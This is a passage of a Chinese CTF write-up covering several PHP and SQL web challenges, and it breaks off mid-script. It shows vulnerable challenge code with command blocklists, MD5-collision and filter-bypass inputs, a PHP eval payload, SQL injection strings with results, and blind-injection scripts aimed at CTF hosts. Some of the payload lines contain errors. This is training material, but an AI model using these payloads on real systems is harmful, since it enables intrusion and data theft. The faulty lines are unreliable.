id=\"安洵杯-2019easy_web\"><a class=\"anchor\" href=\"#安洵杯-2019easy_web\">#</a> [安洵杯 2019] easy_web</h5>\n<blockquote>\n<p>这个题考的是 md5 强绕过以及当很多函数被搬掉后该怎么办<br />\n打开就可以看到图片 base64 以及他的 url，这个 url 也有一串加密经过两次 base64 和一次 hex 解密后即可看到文件名，那试试把这个换成 index.php 查看一下源代码，发现可以把 base64 全部 copy 下来进行解密后看到源代码</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class=\"line\">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class=\"line\">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class=\"line\">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class=\"line\"></span><br><span class=\"line\">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class=\"line\">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class=\"line\">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class=\"line\">    die(&quot;xixi～ no flag&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $cmd;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class=\"line\">    echo(&quot;forbid ~&quot;);</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">        echo `$cmd`;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo (&quot;md5 is funny ~&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  body&#123;</span><br><span class=\"line\">   background:url(./bj.png)  no-repeat center center;</span><br><span class=\"line\">   background-size:cover;</span><br><span class=\"line\">   background-attachment:fixed;</span><br><span class=\"line\">   background-color:#CCCCCC;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>这个代码先使用强比较绕过如下</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class=\"line\">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>然后即可执行命令有两种方法可以执行，如 sort 和使用 \\ 转义可能会好奇那个 \\ 不是过滤了反斜杠了吗，对的但是我们传进去的样子是经过转义的这个是无法过滤的</p>\n</blockquote>\n<h5 id=\"nctf-2018easy_audit\"><a class=\"anchor\" href=\"#nctf-2018easy_audit\">#</a> [NCTF 2018]Easy_Audit</h5>\n<blockquote>\n<p>数组绕过<br />\n $_REQUEST 变量覆盖<br />\n $_SERVER [‘QUERY_STRING’] 特性<br />\n注意绕过时的方法即可<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">_</mi><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mtext>有个特性就是当</mtext><mi>G</mi><mi>E</mi><mi>T</mi><mtext>和</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>有相同的变量时，匹配</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>的变量</mtext></mrow><annotation encoding=\"application/x-tex\">\\_REQUEST有个特性就是当GET和POST有相同的变量时，匹配POST的变量\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.99333em;vertical-align:-0.31em;\"></span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">Q</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">特</span><span class=\"mord cjk_fallback\">性</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">相</span><span class=\"mord cjk_fallback\">同</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span></span></span></span>_SERVER [‘QUERY_STRING’] 匹配的是原始数据，就是没有 url 编码过的数据，所以可以使用 url 编码绕过</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">if($_REQUEST)&#123;  </span><br><span class=\"line\">    foreach ($_REQUEST as $key =&gt; $value) &#123;  </span><br><span class=\"line\">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if($_SERVER)&#123;  </span><br><span class=\"line\">    if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if(isset($_GET[&#x27;yulige&#x27;]))&#123;  </span><br><span class=\"line\">    if(!(substr($_GET[&#x27;yulige&#x27;], 32) === md5($_GET[&#x27;yulige&#x27;])))&#123;         //日爆md5!!!!!!        die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;else&#123;  </span><br><span class=\"line\">        if(preg_match(&#x27;/nctfisfun$/&#x27;, $_GET[&#x27;nctf&#x27;]) &amp;&amp; $_GET[&#x27;nctf&#x27;] !== &#x27;nctfisfun&#x27;)&#123;            $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        if(isset($getflag) &amp;&amp; $getflag === &#x27;ccc_liubi&#x27;)&#123;  </span><br><span class=\"line\">            include &#x27;flag.php&#x27;;  </span><br><span class=\"line\">            echo $flag;  </span><br><span class=\"line\">        &#125;else die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>使用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET: ?%79%75%6C%69%67%65[]=1&amp;%6E%63%74%66=%6E%63%74%66%69%73%66%75%6E%0a&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br><span class=\"line\">POST: yulige=1&amp;nctf=2&amp;flag=1</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1challenge__rce\"><a class=\"anchor\" href=\"#hnctf-2022-week1challenge__rce\">#</a> [HNCTF 2022 Week1]Challenge__rce</h5>\n<blockquote>\n<p>这种题老套路，直接使用自增手法即可进行绕过得到 flag</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">if (isset($_GET[&#x27;hint&#x27;])) &#123;    highlight_file(__FILE__);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">if (isset($_POST[&#x27;rce&#x27;])) &#123;    $rce = $_POST[&#x27;rce&#x27;];  </span><br><span class=\"line\">    if (strlen($rce) &lt;= 120) &#123;  </span><br><span class=\"line\">        if (is_string($rce)) &#123;  </span><br><span class=\"line\">            if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, $rce)) &#123;  </span><br><span class=\"line\">                eval($rce);  </span><br><span class=\"line\">            &#125; else &#123;  </span><br><span class=\"line\">                echo(&quot;Are you hack me?&quot;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125; else &#123;  </span><br><span class=\"line\">            echo &quot;I want string!&quot;;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;too long!&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>传入：</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B</span><br><span class=\"line\">使用的get的1和2进行连接的</span><br><span class=\"line\">没有编码之前是</span><br><span class=\"line\">rce=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"wustctf-2020颜值成绩查询\"><a class=\"anchor\" href=\"#wustctf-2020颜值成绩查询\">#</a> [WUSTCTF 2020] 颜值成绩查询</h5>\n<blockquote>\n<p>过滤了 union 和空格，这个题使用大小写绕过即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,3#使用这个可以查看到回显2，3</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,database()#使用这个可以查看到数据库</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_tables.schema/**/where/**/table_schema=database()#</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_columns.schema/**/where/**/column_schema=&#x27;flag&#x27;#</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(flag,value)/**/from/**/flag#</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>也可以使用布尔盲注如</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;ascii(substr(database(),1,1))=100#</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2023-秋季新生赛rce-plus\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛rce-plus\">#</a> [SWPUCTF 2023 秋季新生赛] RCE-PLUS</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">function strCheck($cmd)  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    if(!preg_match(&quot;/\\;|\\&amp;|\\\\$|\\x09|\\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;, $cmd))&#123;  </span><br><span class=\"line\">        return($cmd);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    else&#123;  </span><br><span class=\"line\">        die(&quot;i hate this&quot;);        </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$cmd=$_GET[&#x27;cmd&#x27;];  </span><br><span class=\"line\">strCheck($cmd);  </span><br><span class=\"line\">shell_exec($cmd);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>这个 rce 非常简单但是需要注意这个 shell_exec 不会回显就只有使用 &gt; 符号去重定向这个内容再去访问</p>\n<h5 id=\"swpuctf-2023-秋季新生赛一键连接\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛一键连接\">#</a> [SWPUCTF 2023 秋季新生赛] 一键连接！</h5>\n<p>都使用数组绕过然后在使用一个 data://text/plain, 他的内容即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">$md5_1 = $_GET[&#x27;md5_1&#x27;];  </span><br><span class=\"line\">$md5_2 = $_GET[&#x27;md5_2&#x27;];  </span><br><span class=\"line\">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];  </span><br><span class=\"line\">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];  </span><br><span class=\"line\">$new_player =$_GET[&#x27;new_player&#x27;];  </span><br><span class=\"line\">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;  </span><br><span class=\"line\">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;  </span><br><span class=\"line\">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;  </span><br><span class=\"line\">            echo &quot;Congratulations~~~~~~~~~&quot;;  </span><br><span class=\"line\">            echo &quot;试试need Antsword&lt;br/&gt;&quot;;  </span><br><span class=\"line\">            @eval($_POST[&#x27;Nss&#x27;]);  </span><br><span class=\"line\">        &#125;else&#123;  </span><br><span class=\"line\">            echo &quot;可曾听过data协议?&quot;;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;sha1又如何相等呢&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; else &#123;  </span><br><span class=\"line\">    echo &quot;如何让md5值相等呢¿&quot;;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#护网杯-2018easy_tornado\">#</a> [护网杯 2018] easy_tornado</h5>\n<p>查看 flag.txt 提供了 flag 的路径，然后 hint 提供了加密方法，看 url 可知道这个题的方法，然后在去 error?msg = 处来使用命令</p>\n<h5 id=\"hnctf-2022-week2easy_sql\"><a class=\"anchor\" href=\"#hnctf-2022-week2easy_sql\">#</a> [HNCTF 2022 WEEK2]easy_sql</h5>\n<p>无字符漏洞</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;union/**/select/**/1,2,database()/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ctf</span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ctf,ctftraining,ctftraining,ctftraining,mysql </span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ccctttfff,flag,news,users,gtid_slave_pos </span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">1,NSSCTF&#123;da2750d9-7bb8-4470-9118-ccdfb258d822&#125; </span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了 and information_schema 空格</span><br></pre></td></tr></table></figure></p>\n<p>学到一个思路当 #和 --+ 被过滤时我们可以使用 %00</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from urllib import parse</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;http://node2.anna.nssctf.cn:28555/index.php&#x27;</span><br><span class=\"line\">payload=f&quot;0&#x27;/**/union/**/select/**/1,2,group_concat(`2`)/**/from/**/(select/**/2/**/union/**/(select/**/*/**/from/**/ctftraining.flag))a/**/;&#123;parse.unquote(&#x27;%00&#x27;)&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data=&#123;&quot;id&quot;:payload&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">req=requests.post(url=url,data=data)</span><br><span class=\"line\">print(req.text)</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"roarctf-2019online-proxy\"><a class=\"anchor\" href=\"#roarctf-2019online-proxy\">#</a> [RoarCTF 2019]Online Proxy</h5>\n<p>x-forwarded-for 的二次注入</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">url =<span class=\"string\">&quot;http://node4.buuoj.cn:27074/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">head=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>:<span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie&#x27;</span>:<span class=\"string\">&#x27;8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">200</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">    left = <span class=\"number\">31</span></span><br><span class=\"line\">    right = <span class=\"number\">127</span></span><br><span class=\"line\">    mid = left + ((right - left)&gt;&gt;<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> left &lt; right:</span><br><span class=\"line\">        <span class=\"comment\">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        <span class=\"comment\">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        <span class=\"comment\">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        payload = <span class=\"string\">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class=\"built_in\">format</span>(i,mid)</span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span 